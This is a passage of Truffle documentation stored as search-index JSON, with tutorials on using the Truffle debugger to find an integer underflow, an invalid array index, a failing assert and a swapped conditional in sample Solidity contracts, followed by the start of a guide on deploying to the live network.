fibseries . push ( 1 ); ^ It's rather tedious to constantly press v after every state change. Thankfully, you can set certain variables to be \"watched\", so that they will display after every movement in the debugger. The syntax to watch a variable is +:<variable> . So let's watch the variables we care about ( i and fibseries ) with the following two commands: +: i +: fibseries After each command, the current value of the variable will display. But once done, we'll get a persistent display of the variables and their values. Press Enter to move to the next instruction: 9 : 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); ^^^^^^^^^^^^^^^^^ : i 0 : fibseries [] Notice that after the current instruction, the watched variables are displayed automatically. You can also watch expressions, not just variables. Run the following expression to make our output a little more compact. +: { i , fibseries } This will output as follows: { i : 0 , fibseries : [] } Since we have all we need in this one expression, we can unwatch the individual variables. The syntax to watch a variable is -:<variable> . -: i -: fibseries Now we'll only be watching the single expression comprising the two variables. Press Enter to move to the next instruction and see the output: 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); 12 : fibseries . push ( 1 ); ^^^^^^^^^ : { i , fibseries } { i : 0 , fibseries : [ 1 ] } Notice that we have now populated the first entry in the sequence. Because the debugger steps through each instruction one at a time, it's going to take a long time to see results if we don't pick up our pace. Luckily, the debugger can \"step over\", which steps over the current line, moving to the next line, as long as it's at the same function depth. This will allow us to make progress much more quickly. So type o to step over the current instruction set. The output will be: 13 : 14 : // generate subsequent entries 15 : for ( uint i = 2 ; i < n ; i ++ ) { ^ : { i , fibseries } { i : 0 , fibseries : [ 1 , 1 ] } Here we see that we have populated the first two entries in the sequence. Since Enter will replay the previous command, press Enter now to step over again: 14 : // generate subsequent entries 15 : for ( uint i = 2 ; i < n ; i ++ ) { 16 : fibseries . push ( fibseries [ i - 1 ] + fibseries [ i - 2 ]); ^^^^^^^^^ : { i , fibseries } { i : 2 , fibseries : [ 1 , 1 ] } Now that we have two entries in our sequence, we've moved into our for loop. Continue pressing Enter and watching the variable output. You should notice that when i gets to 10 , the for loop ends (as the loop terminates at i < n ). The final array is: [ 1 , 1 , 2 , 3 , 5 , 8 , 13 , 21 , 34 , 55 ] It can be verified that this is the correct first ten entries in the Fibonacci sequence.", "title": "Debugging a transaction"}, {"location": "guides/debugger-variable-inspection/#debugging-unexpected-output", "text": "Our contract as we have created it is working as expected. That's great, but we can't always get so lucky. Sometimes a contract appears to work fine (no errors are thrown) but the output is not what you'd expect. Let's examine that here. It's amazing what switching a plus sign for a minus sign can do. Instead of the Fibonacci sequence: F [ 1 ] = 1 F [ 2 ] = 1 F [ n ] = F [ n - 1 ] + F [ n - 2 ] Let's switch the plus for a minus sign: F [ 1 ] = 1 F [ 2 ] = 1 F [ n ] = F [ n - 1 ] - F [ n - 2 ] (I don't know if this series has a name, so we'll just call it the \"Trufflenacci\" sequence.) Let's edit our contract and see what happens. Open the Fibonacci.sol file. Edit the definition of our fibseries[] array to be of type uint8[] . uint8 [] fibseries ; Note : A `uint8` is an unsigned integer with 8 bits, with a maximum value of 2^8 = 255. Compare this to a `uint`, which is a 256 bit number with a maximum value of 2^256. Edit the for loop so that the terms are subtracted instead of added: fibseries . push ( fibseries [ i - 1 ] - fibseries [ i - 2 ]); Save this file. Back on the console, recompile the contract. compile --all Note : The `--all` flag with force recompile all of the contracts. Remigrate the contract to the blockchain. migrate --reset We can now run the same command as before, which will generate a new transaction: Fibonacci . deployed (). then ( function ( instance ) { return instance . generateFib ( 10 ); }); As before, the output of the console will be the transaction details. Note the transaction hash (the value of tx: ). Type debug and then the value of tx: found in your transaction details. This will enter the debugger again. Fibonacci . sol : 1 : pragma solidity ^ 0.4.22 ; 2 : 3 : contract Fibonacci { ^^^^^^^^^^^^^^^^^^^^ We're curious about what our fibseries array is going to look like, so let's watch it: +: fibseries The response will be undefined , because we haven't yet gotten to the point in the code where that array was defined. Let's \"step over\" execution, so as to speed things up (\"step next\" takes much longer, as it's a more granular process). You can \"step over\" by running the o command. Fibonacci . sol : 6 : 7 : // n = how many in the series to return 8 : function generateFib ( uint n ) public { ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ : fibseries [] The array is defined, but is still empty. Since Enter repeats the previous command (in our case, \"step over\"), press Enter twice. You'll see that the first element of fibseries has been populated. 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); 12 : fibseries . push ( 1 ); ^^^^^^^^^ : fibseries [ 1 ] Keep pressing Enter until four elements have been populated: : fibseries [ 1 , 1 , 0 , 255 ] Something seems off here. Obviously, if you were expecting the Fibonacci series, by this point you would realize that you had veered far off course. But the jump from 0 to 255 should be suspicious too. And in fact, what we're seeing is a buffer underflow , a situation where we have an unsigned integer , which can hold only positive values, being set to less than zero. Specifically, that fourth value is defined as the difference between the previous two elements, so 0 - 1 = -1 . Our type is uint8[] which means that each integer in the array is defined by 8 bits, so its maximum value is 2^8 - 1 = 255. Subtract one from zero, and the value \"wraps around\" to its maximum value. Assuming this was the series we wanted (and that our minus sign was correct), the way to change this is to change the definition of our fibseries array from uint8[] to int8[] . That would make values \"signed integers\" and able to accept negative values, giving you an array that would look like this instead: [ 1 , 1 , 0 , - 1 ]", "title": "Debugging unexpected output"}, {"location": "guides/debugger-variable-inspection/#debugging-errors", "text": "Sometimes, contracts have errors in them. They may compile just fine, but when you go to use them, problems arise. This is one of the reasons to use Ganache over a public testnet: you can easily redeploy a contract without any penalty in time or ether. So we're going to introduce a small error, a misnumbering in our for loop that will cause it to have an invalid index. Open the Fibonacci.sol file again. Edit the for loop so that the i variable starts from 1 for ( uint i = 1 ; i < n ; i ++ ) { Save this file. Back on the console, recompile the contract. compile --all Remigrate the contract to the blockchain. migrate --reset Run the same command as before: Fibonacci . deployed (). then ( function ( instance ) { return instance . generateFib ( 10 ); }); You'll see an error, which will start with this: Error: VM Exception while processing transaction: invalid opcode Well that's not good. Moreover, the output didn't give us a transaction ID to debug, so we're going to need to look elsewhere for it. Thankfully, Ganache can tell us the transaction information. Go back in Ganache and click the \"Logs\" link at the top: Click this button to open the logs At the very bottom of the logs, you will see a transaction ID listed near an error saying invalid opcode . This is the one we need. Copy this transaction ID. Ganache logs Back in the console, type debug and paste in the transaction ID. This will enter the debugger again. Let's watch the same compacted expression as before, showing both the value of i and the value of fibseries . +: { i , fibseries } Continually step next. You will eventually reach a state where the debugger will error out. 14 : // generate subsequent entries 15 : for ( uint i = 1 ; i < n ; i ++ ) { 16 : fibseries . push ( fibseries [ i - 1 ] - fibseries [ i - 2 ]); ^^^^^^^^^^^^^^ : { i , fibseries } { i : 1 , fibseries : [ 1 , 1 ] } debug ( development : 0x948da9db ...) > Transaction halted with a RUNTIME ERROR . This is likely due to an intentional halting expression , like assert (), require () or revert (). It can also be due to out - of - gas exceptions . Please inspect your transaction parameters and contract code to determine the meaning of this error . Note that the contract is failing at the point where it tries to determine the value of fibseries[i-2] But in our debugger, we know that the current value of i is 1 , so i-2 is going to be -1 (or actually 2^256 - 1 , due to the buffer underflow issue we talked about above, and with i defined as a uint ). Since either one of those values are invalid (you can't have a negative index, and the value at index 2^256 - 1 is clearly not defined), the contract halts with an error. These are just some of the ways that you can use variable inspection to debug your contracts. We're constantly adding functionality of the debugger, so please raise an issue on our Github page or ask a fellow Truffler in our GitHub Discussions . Happy debugging!", "title": "Debugging errors"}, {"location": "guides/debugging-an-example-smart-contract/", "text": "Note : This tutorial requires Truffle version 4.0 or newer. A smart contract in Ethereum is just code. Unlike the \"paper\" contracts that you find elsewhere, this contract needs to make sense in a very precise manner. (And that's a good thing. Imagine how much clearer real-world contracts would be if they needed to \"compile\"?) If our contracts are not coded correctly, our transactions may fail, which can result in the loss of ether (in the form of gas), not to mention wasted time and effort. Luckily, Truffle (as of version 4) has a built in debugger for stepping through your code. So when something goes wrong, you can find out exactly what it was, and fix it promptly. In this tutorial, we will migrate a basic contract to a test blockchain, introduce some errors into it, and solve each one through the use of the built-in Truffle debugger. A basic smart contract \u00b6 One of the most basic, non-trivial, types of smart contract is a simple storage contract . (This example was adapted from the Solidity documentation .) pragma solidity ^ 0.8.10 ; contract SimpleStorage { uint myVariable ; function set ( uint x ) public { myVariable = x ; } function get () constant public returns ( uint ) { return myVariable ; } } This contract does two things: Allows you to set a variable ( myVariable ) to a particular integer value Allows you to query that variable to get the selected value This isn't a very interesting contract, but that's not the point here. We want to see what happens when things go wrong. First, let's set up our environment. Deploying the basic smart contract \u00b6 Create a new directory where we will house our contract locally: mkdir simple-storage cd simple-storage Create a bare Truffle project: truffle init This will create directories such as contracts/ and migrations/ , and populate them with files we will use when we deploy our contract to the blockchain. Inside the contracts/ directory, create a file called Store.sol with the following content: pragma solidity ^ 0.8.10 ; contract SimpleStorage { uint myVariable ; function set ( uint x ) public { myVariable = x ; } function get () constant public returns ( uint ) { return myVariable ; } } This is the contract that we will be debugging. While the full details of this file are beyond the scope of this tutorial, note that there is a contract named SimpleStorage that contains a numeric variable myVariable and two functions: set() and get() . The first function stores a value in that variable and the second queries that value. Inside the migrations/ directory, create a file called 2_deploy_contracts.js and populate it with the following content: var SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = function ( deployer ) { deployer . deploy ( SimpleStorage ); }; This file is the directive that allows us to deploy the SimpleStorage contract to the blockchain. On the terminal, compile the smart contract: truffle compile Open a second terminal and run truffle develop to start a development blockchain built directly into Truffle that we can use to test our contract: truffle develop The console will display a prompt truffle(develop)> . From here, unless otherwise specified, all commands will be typed on this prompt. With the develop console up and running, we can now deploy our contracts to the blockchain by running our migrations: migrate The response should look something like below, though the specific IDs will differ: Starting migrations... ====================== > Network name: 'develop' > Network id: 5777 > Block gas limit: 6721975 ( 0x6691b7 ) # 1_initial_migration.js Deploying 'Migrations' --- > transaction hash: 0xbaf1963942bd99e949a966c16d204c4786fdbfde096f5fed0ec4c82e7b85aff5 > ... > total cost: 0 .000497708 ETH > Saving migration to chain. > Saving artifacts --- > Total cost: 0 .000497708 ETH # 2_deploy_contracts.js Deploying 'SimpleStorage' --- > transaction hash: 0xf4bf0a56cff1e1e5c121a3b1688a0103f12b8c45c4ed99818d160a1e3cc064f1 > ... > total cost: 0 .000251306 ETH > Saving migration to chain. > Saving artifacts --- > Total cost: 0 .000251306 ETH # Summary > Total deployments: 2 > Final cost: 0 .000749014 ETH - Fetching solc version list from solc-bin. Attempt #1 - Blocks: 0 Seconds: 0 - Saving migration to chain. - Blocks: 0 Seconds: 0 - Saving migration to chain. Interacting with the basic smart contract \u00b6 The smart contract is now deployed to a test network via truffle develop , which launches a console against Ganache , a local development blockchain built right into Truffle. We next want to interact with the smart contract to see how it works when working correctly. We'll interact using the truffle develop console. Note : If you're wondering why we didn't need to mine to get the transaction to be secured, the Truffle Develop console already takes care of that for us. If using a different network, you'll need to make sure you mine to get the transaction on the blockchain. In the console where truffle develop is running, run the following command: SimpleStorage . deployed () . then ( function ( instance ) { return instance . get . call (); }) . then ( function ( value ) { return value . toNumber (); }); This command looks at the SimpleStorage contract, and then calls the get() function as defined inside it. It then returns the output, which is usually rendered as a string, and converts it to a number: 0 This shows us that our variable, myVariable , is set to 0 , even though we haven't set this variable to any value (yet). This is because variables with integer types are automatically populated with the value of zero in Solidity , unlike other languages where it might be NULL or undefined . Now let's run a transaction on our contract. We'll do this by running the set() function, where we can set our variable value to some other integer. Run the following command: SimpleStorage . deployed (). then ( function ( instance ) { return instance . set ( 4 ); }); This sets the variable to 4 . The output shows some information about the transaction, including the transaction ID (hash), transaction receipt, and any event logs that were triggered during the course of the transaction: { tx : '0x3af6c0644b34cfb60b00d352212da19ba425dd70d9175380cc709cd5020bc06b' , receipt : { transactionHash : '0x3af6c0644b34cfb60b00d352212da19ba425dd70d9175380cc709cd5020bc06b' , transactionIndex : 0 , blockHash : '0x243abc6a762a89c526256833c38e1ce3fd166dffeaff721f55e31cff89c719d9' , blockNumber : 5 , from : '0x8e0128437dc799045b9c24da41eda77f0dea281b' , to : '0x30775260f639d51a837b094cc9f66dc1426f3efb' , gasUsed : 41602 , cumulativeGasUsed : 41602 , contractAddress : null , logs : [], status : true , logsBloom : '0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' , rawLogs : [] }, logs : [] } Most important to us is the transaction ID (listed here both as tx and as transactionHash ). We'll need to copy that value when we start to debug. Note : Your transaction IDs will likely be different from what is listed here. To verify that the variable has changed values, run the get() function again: SimpleStorage . deployed () . then ( function ( instance ) { return instance . get . call (); }) . then ( function ( value ) { return value . toNumber (); }); The output should look like this: 4 Debugging errors \u00b6 The above shows how the contract should work. Now, we will introduce some small errors to the contract and redeploy it. We will see how the issues present themselves, and also use Truffle's built-in debug feature to fix the issues . We will look at the following issues: Invalid error check No error, but a function isn't operating as desired Issue #1: An invalid error check \u00b6 Type q to exit the debugger. Issue #2: An invalid error check \u00b6 Smart contracts can use statements like assert() to ensure that certain conditions are met. These can conflict with the state of the contract in ways that are irreconcilable. Here we will introduce such a condition, and then see how the debugger can find it. Introducing the error \u00b6 Open Store.sol again. Replace the set() function with the following: function set ( uint x ) public { assert ( x == 0 ); myVariable = x ; } This is the same as the original version, but with an assert() function added, testing to make sure that x == 0 . This will be fine until we set that value to something else, and then we'll have a problem. Testing the contract \u00b6 Just as before, we'll reset the contract on the blockchain. In the Truffle Develop console, reset the contract on the blockchain to its initially deployed state: migrate --reset Now we are ready to test the new transaction. Run the same command as above: SimpleStorage . deployed (). then ( function ( instance ) { return instance . set ( 4 ); }); You will see an error: Uncaught Error: Returned error: VM Exception while processing transaction: revert at evalmachine.<anonymous>:0:66 This means that we have a problem on our hands. In the log window, note the transaction ID with that error in the data key: data: { '0x51f9cce23b57b15fafb13defc52225b1da2e29c5ce15f40a8ef793d2fff1546b' : { error: 'revert' , program_counter: 346 , ... Debugging the issue \u00b6 Copy the transaction ID and use it as an argument to the debug command: debug 0x51f9cce23b57b15fafb13defc52225b1da2e29c5ce15f40a8ef793d2fff1546b Note : Again, your transaction ID will be different from what is listed here. Now we are back in the debugger: Store . sol : 1 : pragma solidity ^ 0.8.10 ; 2 : 3 : contract SimpleStorage { ^^^^^^^^^^^^^^^^^^^^^^^^ debug ( develop : 0x51f9cce2 ...) > Press Enter a few times to step through the code. Eventually, the debugger will halt with an error message: Store . sol : 5 : 6 : function set ( uint x ) public { 7 : assert ( x == 0 ); ^^^^^^^^^^^^ debug ( develop : 0x51f9cce2 ...) > Transaction has halted ; cannot advance . It is this last event that is triggering the error. You can see that it is the assert() that is to blame. Issue #2: A function isn't operating as desired \u00b6 Sometimes, an error isn't a true error, in that it doesn't cause a problem at runtime, but instead is just doing something that you don't intend it to do. Take for example an event that would run if our variable was odd and another event that would run if our variable was even. If we accidentally swapped this conditional so that the opposite function would run, it wouldn't cause an error; nevertheless, the contract would act unexpectedly. Once again, we can use the debugger to see where things go wrong. Introducing the error \u00b6 Open Store.sol again. Replace the set() function with the following: event Odd (); event Even (); function set ( uint x ) public { myVariable = x ; if ( x % 2 == 0 ) { emit Odd (); } else { emit Even (); } } This code introduces two dummy events, Odd() and Even() that are triggered based on a conditional that checks whether x is divisible by 2 . But notice that we have the results flipped. If x is divisible by 2 , the Odd() event will run. Testing the contract \u00b6 Just as before, we'll reset the contract on the blockchain. In the Truffle Develop console, update the contract: migrate --reset You will see both the compiler output and the migration output. Now we are ready to test the new transaction. Run the same command as above: SimpleStorage . deployed (). then ( function ( instance ) { return instance . set ( 4 ); }); Note that there is no error here. The response is given as a transaction ID with details: { tx : '0x31d64ba6ed196d12b634b1ea7cbe0612b3dc623ee6d25f0fc59091e1e19dfe08' , receipt : { transactionHash : '0x31d64ba6ed196d12b634b1ea7cbe0612b3dc623ee6d25f0fc59091e1e19dfe08' , transactionIndex : 0 , blockHash : '0x4ef7b0987604e6ca92382d75d16e746de2415fa482d7cfc85d9183e966d5beaf' , blockNumber : 5 , from : '0x8e0128437dc799045b9c24da41eda77f0dea281b' , to : '0x30775260f639d51a837b094cc9f66dc1426f3efb' , gasUsed : 42597 , cumulativeGasUsed : 42597 , contractAddress : null , logs : [ [ Object ] ], status : true , logsBloom : '0x000...' , rawLogs : [ [ Object ] ] }, logs : [ { logIndex : 0 , transactionIndex : 0 , transactionHash : '0x31d64ba6ed196d12b634b1ea7cbe0612b3dc623ee6d25f0fc59091e1e19dfe08' , blockHash : '0x4ef7b0987604e6ca92382d75d16e746de2415fa482d7cfc85d9183e966d5beaf' , blockNumber : 5 , address : '0x30775260F639D51a837b094Cc9f66DC1426f3EFB' , type : 'mined' , id : 'log_8a20539f' , event : 'Odd' , args : [ Result ] } ] } But notice the logs of the transaction show the event Odd . That's wrong, and so our job is to find out why that's being invoked. Debugging the contract \u00b6 Copy that transaction ID and use it as an argument with the debug command: debug 0x31d64ba6ed196d12b634b1ea7cbe0612b3dc623ee6d25f0fc59091e1e19dfe08 Note : Again, your transaction ID will be different from what is listed here. You will enter the debugger as before. Press Enter multiple times to cycle through the steps. Eventually you will see that the conditional leads to the Odd() event: Store . sol : 9 : function set ( uint x ) public { 10 : myVariable = x ; 11 : if ( x % 2 == 0 ) { ^^^^^^^^^^^^^^^^^ debug ( develop : 0x31d64ba6 ...) > n Store . sol : 10 : myVariable = x ; 11 : if ( x % 2 == 0 ) { 12 : emit Odd (); ^^^^^ debug ( develop : 0x31d64ba6 ...) > The problem is revealed. The conditional is leading to the wrong event. Conclusion \u00b6 With the ability to debug your contracts directly within Truffle, you have even more power at your hands to make your smart contracts rock-solid and ready to deploy. Make sure to read more about Truffle Develop console and the debugger in the docs. If you have any trouble, please don't hesitate to open an issue on Github ! Happy debugging!", "title": "Debugging an Example Smart Contract"}, {"location": "guides/debugging-an-example-smart-contract/#a-basic-smart-contract", "text": "One of the most basic, non-trivial, types of smart contract is a simple storage contract . (This example was adapted from the Solidity documentation .) pragma solidity ^ 0.8.10 ; contract SimpleStorage { uint myVariable ; function set ( uint x ) public { myVariable = x ; } function get () constant public returns ( uint ) { return myVariable ; } } This contract does two things: Allows you to set a variable ( myVariable ) to a particular integer value Allows you to query that variable to get the selected value This isn't a very interesting contract, but that's not the point here. We want to see what happens when things go wrong. First, let's set up our environment.", "title": "A basic smart contract"}, {"location": "guides/debugging-an-example-smart-contract/#deploying-the-basic-smart-contract", "text": "Create a new directory where we will house our contract locally: mkdir simple-storage cd simple-storage Create a bare Truffle project: truffle init This will create directories such as contracts/ and migrations/ , and populate them with files we will use when we deploy our contract to the blockchain. Inside the contracts/ directory, create a file called Store.sol with the following content: pragma solidity ^ 0.8.10 ; contract SimpleStorage { uint myVariable ; function set ( uint x ) public { myVariable = x ; } function get () constant public returns ( uint ) { return myVariable ; } } This is the contract that we will be debugging. While the full details of this file are beyond the scope of this tutorial, note that there is a contract named SimpleStorage that contains a numeric variable myVariable and two functions: set() and get() . The first function stores a value in that variable and the second queries that value. Inside the migrations/ directory, create a file called 2_deploy_contracts.js and populate it with the following content: var SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = function ( deployer ) { deployer . deploy ( SimpleStorage ); }; This file is the directive that allows us to deploy the SimpleStorage contract to the blockchain. On the terminal, compile the smart contract: truffle compile Open a second terminal and run truffle develop to start a development blockchain built directly into Truffle that we can use to test our contract: truffle develop The console will display a prompt truffle(develop)> . From here, unless otherwise specified, all commands will be typed on this prompt. With the develop console up and running, we can now deploy our contracts to the blockchain by running our migrations: migrate The response should look something like below, though the specific IDs will differ: Starting migrations... ====================== > Network name: 'develop' > Network id: 5777 > Block gas limit: 6721975 ( 0x6691b7 ) # 1_initial_migration.js Deploying 'Migrations' --- > transaction hash: 0xbaf1963942bd99e949a966c16d204c4786fdbfde096f5fed0ec4c82e7b85aff5 > ... > total cost: 0 .000497708 ETH > Saving migration to chain. > Saving artifacts --- > Total cost: 0 .000497708 ETH # 2_deploy_contracts.js Deploying 'SimpleStorage' --- > transaction hash: 0xf4bf0a56cff1e1e5c121a3b1688a0103f12b8c45c4ed99818d160a1e3cc064f1 > ... > total cost: 0 .000251306 ETH > Saving migration to chain. > Saving artifacts --- > Total cost: 0 .000251306 ETH # Summary > Total deployments: 2 > Final cost: 0 .000749014 ETH - Fetching solc version list from solc-bin. Attempt #1 - Blocks: 0 Seconds: 0 - Saving migration to chain. - Blocks: 0 Seconds: 0 - Saving migration to chain.", "title": "Deploying the basic smart contract"}, {"location": "guides/debugging-an-example-smart-contract/#interacting-with-the-basic-smart-contract", "text": "The smart contract is now deployed to a test network via truffle develop , which launches a console against Ganache , a local development blockchain built right into Truffle. We next want to interact with the smart contract to see how it works when working correctly. We'll interact using the truffle develop console. Note : If you're wondering why we didn't need to mine to get the transaction to be secured, the Truffle Develop console already takes care of that for us. If using a different network, you'll need to make sure you mine to get the transaction on the blockchain. In the console where truffle develop is running, run the following command: SimpleStorage . deployed () . then ( function ( instance ) { return instance . get . call (); }) . then ( function ( value ) { return value . toNumber (); }); This command looks at the SimpleStorage contract, and then calls the get() function as defined inside it. It then returns the output, which is usually rendered as a string, and converts it to a number: 0 This shows us that our variable, myVariable , is set to 0 , even though we haven't set this variable to any value (yet). This is because variables with integer types are automatically populated with the value of zero in Solidity , unlike other languages where it might be NULL or undefined . Now let's run a transaction on our contract. We'll do this by running the set() function, where we can set our variable value to some other integer. Run the following command: SimpleStorage . deployed (). then ( function ( instance ) { return instance . set ( 4 ); }); This sets the variable to 4 . The output shows some information about the transaction, including the transaction ID (hash), transaction receipt, and any event logs that were triggered during the course of the transaction: { tx : '0x3af6c0644b34cfb60b00d352212da19ba425dd70d9175380cc709cd5020bc06b' , receipt : { transactionHash : '0x3af6c0644b34cfb60b00d352212da19ba425dd70d9175380cc709cd5020bc06b' , transactionIndex : 0 , blockHash : '0x243abc6a762a89c526256833c38e1ce3fd166dffeaff721f55e31cff89c719d9' , blockNumber : 5 , from : '0x8e0128437dc799045b9c24da41eda77f0dea281b' , to : '0x30775260f639d51a837b094cc9f66dc1426f3efb' , gasUsed : 41602 , cumulativeGasUsed : 41602 , contractAddress : null , logs : [], status : true , logsBloom : '0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' , rawLogs : [] }, logs : [] } Most important to us is the transaction ID (listed here both as tx and as transactionHash ). We'll need to copy that value when we start to debug. Note : Your transaction IDs will likely be different from what is listed here. To verify that the variable has changed values, run the get() function again: SimpleStorage . deployed () . then ( function ( instance ) { return instance . get . call (); }) . then ( function ( value ) { return value . toNumber (); }); The output should look like this: 4", "title": "Interacting with the basic smart contract"}, {"location": "guides/debugging-an-example-smart-contract/#debugging-errors", "text": "The above shows how the contract should work. Now, we will introduce some small errors to the contract and redeploy it. We will see how the issues present themselves, and also use Truffle's built-in debug feature to fix the issues . We will look at the following issues: Invalid error check No error, but a function isn't operating as desired", "title": "Debugging errors"}, {"location": "guides/debugging-an-example-smart-contract/#issue-1-an-invalid-error-check", "text": "Type q to exit the debugger.", "title": "Issue #1: An invalid error check"}, {"location": "guides/debugging-an-example-smart-contract/#issue-2-an-invalid-error-check", "text": "Smart contracts can use statements like assert() to ensure that certain conditions are met. These can conflict with the state of the contract in ways that are irreconcilable. Here we will introduce such a condition, and then see how the debugger can find it.", "title": "Issue #2: An invalid error check"}, {"location": "guides/debugging-an-example-smart-contract/#introducing-the-error", "text": "Open Store.sol again. Replace the set() function with the following: function set ( uint x ) public { assert ( x == 0 ); myVariable = x ; } This is the same as the original version, but with an assert() function added, testing to make sure that x == 0 . This will be fine until we set that value to something else, and then we'll have a problem.", "title": "Introducing the error"}, {"location": "guides/debugging-an-example-smart-contract/#testing-the-contract", "text": "Just as before, we'll reset the contract on the blockchain. In the Truffle Develop console, reset the contract on the blockchain to its initially deployed state: migrate --reset Now we are ready to test the new transaction. Run the same command as above: SimpleStorage . deployed (). then ( function ( instance ) { return instance . set ( 4 ); }); You will see an error: Uncaught Error: Returned error: VM Exception while processing transaction: revert at evalmachine.<anonymous>:0:66 This means that we have a problem on our hands. In the log window, note the transaction ID with that error in the data key: data: { '0x51f9cce23b57b15fafb13defc52225b1da2e29c5ce15f40a8ef793d2fff1546b' : { error: 'revert' , program_counter: 346 , ...", "title": "Testing the contract"}, {"location": "guides/debugging-an-example-smart-contract/#debugging-the-issue", "text": "Copy the transaction ID and use it as an argument to the debug command: debug 0x51f9cce23b57b15fafb13defc52225b1da2e29c5ce15f40a8ef793d2fff1546b Note : Again, your transaction ID will be different from what is listed here. Now we are back in the debugger: Store . sol : 1 : pragma solidity ^ 0.8.10 ; 2 : 3 : contract SimpleStorage { ^^^^^^^^^^^^^^^^^^^^^^^^ debug ( develop : 0x51f9cce2 ...) > Press Enter a few times to step through the code. Eventually, the debugger will halt with an error message: Store . sol : 5 : 6 : function set ( uint x ) public { 7 : assert ( x == 0 ); ^^^^^^^^^^^^ debug ( develop : 0x51f9cce2 ...) > Transaction has halted ; cannot advance . It is this last event that is triggering the error. You can see that it is the assert() that is to blame.", "title": "Debugging the issue"}, {"location": "guides/debugging-an-example-smart-contract/#issue-2-a-function-isnt-operating-as-desired", "text": "Sometimes, an error isn't a true error, in that it doesn't cause a problem at runtime, but instead is just doing something that you don't intend it to do. Take for example an event that would run if our variable was odd and another event that would run if our variable was even. If we accidentally swapped this conditional so that the opposite function would run, it wouldn't cause an error; nevertheless, the contract would act unexpectedly. Once again, we can use the debugger to see where things go wrong.", "title": "Issue #2: A function isn't operating as desired"}, {"location": "guides/debugging-an-example-smart-contract/#introducing-the-error_1", "text": "Open Store.sol again. Replace the set() function with the following: event Odd (); event Even (); function set ( uint x ) public { myVariable = x ; if ( x % 2 == 0 ) { emit Odd (); } else { emit Even (); } } This code introduces two dummy events, Odd() and Even() that are triggered based on a conditional that checks whether x is divisible by 2 . But notice that we have the results flipped. If x is divisible by 2 , the Odd() event will run.", "title": "Introducing the error"}, {"location": "guides/debugging-an-example-smart-contract/#testing-the-contract_1", "text": "Just as before, we'll reset the contract on the blockchain. In the Truffle Develop console, update the contract: migrate --reset You will see both the compiler output and the migration output. Now we are ready to test the new transaction. Run the same command as above: SimpleStorage . deployed (). then ( function ( instance ) { return instance . set ( 4 ); }); Note that there is no error here. The response is given as a transaction ID with details: { tx : '0x31d64ba6ed196d12b634b1ea7cbe0612b3dc623ee6d25f0fc59091e1e19dfe08' , receipt : { transactionHash : '0x31d64ba6ed196d12b634b1ea7cbe0612b3dc623ee6d25f0fc59091e1e19dfe08' , transactionIndex : 0 , blockHash : '0x4ef7b0987604e6ca92382d75d16e746de2415fa482d7cfc85d9183e966d5beaf' , blockNumber : 5 , from : '0x8e0128437dc799045b9c24da41eda77f0dea281b' , to : '0x30775260f639d51a837b094cc9f66dc1426f3efb' , gasUsed : 42597 , cumulativeGasUsed : 42597 , contractAddress : null , logs : [ [ Object ] ], status : true , logsBloom : '0x000...' , rawLogs : [ [ Object ] ] }, logs : [ { logIndex : 0 , transactionIndex : 0 , transactionHash : '0x31d64ba6ed196d12b634b1ea7cbe0612b3dc623ee6d25f0fc59091e1e19dfe08' , blockHash : '0x4ef7b0987604e6ca92382d75d16e746de2415fa482d7cfc85d9183e966d5beaf' , blockNumber : 5 , address : '0x30775260F639D51a837b094Cc9f66DC1426f3EFB' , type : 'mined' , id : 'log_8a20539f' , event : 'Odd' , args : [ Result ] } ] } But notice the logs of the transaction show the event Odd . That's wrong, and so our job is to find out why that's being invoked.", "title": "Testing the contract"}, {"location": "guides/debugging-an-example-smart-contract/#debugging-the-contract", "text": "Copy that transaction ID and use it as an argument with the debug command: debug 0x31d64ba6ed196d12b634b1ea7cbe0612b3dc623ee6d25f0fc59091e1e19dfe08 Note : Again, your transaction ID will be different from what is listed here. You will enter the debugger as before. Press Enter multiple times to cycle through the steps. Eventually you will see that the conditional leads to the Odd() event: Store . sol : 9 : function set ( uint x ) public { 10 : myVariable = x ; 11 : if ( x % 2 == 0 ) { ^^^^^^^^^^^^^^^^^ debug ( develop : 0x31d64ba6 ...) > n Store . sol : 10 : myVariable = x ; 11 : if ( x % 2 == 0 ) { 12 : emit Odd (); ^^^^^ debug ( develop : 0x31d64ba6 ...) > The problem is revealed. The conditional is leading to the wrong event.", "title": "Debugging the contract"}, {"location": "guides/debugging-an-example-smart-contract/#conclusion", "text": "With the ability to debug your contracts directly within Truffle, you have even more power at your hands to make your smart contracts rock-solid and ready to deploy. Make sure to read more about Truffle Develop console and the debugger in the docs. If you have any trouble, please don't hesitate to open an issue on Github ! Happy debugging!", "title": "Conclusion"}, {"location": "guides/deploying-to-the-live-network/", "text": "When you're finished developing your contracts and would like others to use them, the next step is to deploy them to the live network. By now you will have been working on a development network like Ganache , and you will have noticed Truffle is set up to support that by default. Deploying to the live network -- or any other network -- will require that you first connect one of the many Ethereum clients to your network of choice, as well as configure Truffle correctly. Setting Up Your Ethereum client \u00b6 There are many Ethereum clients to choose from. The most popular are go-ethereum and cpp-ethereum . This tutorial cannot go into the details of setting up each client for each operating system, but be sure your desired client is installed and configured to perform the following: Your client is completely synced with the live network Your client is hosting an RPC server on 127.0.0.1 and port 8546 (for this tutorial) Your client has at least one account registered and can sign transactions for that account The registered account contains enough Ether to deploy your contracts If you don't want to set up an Ethereum client yourself, you can alternatively use Infura . This will require you configure Truffle correctly for Infura before proceeding. Configuring Truffle \u00b6 The default Truffle configuration without any bells and whistles looks like this: module . exports = { rpc : { host : \"127.0.0.1\" , port : 8545 } }; This tells Truffle that by default it should connect to an Ethereum client at host 127.0.0.1 and 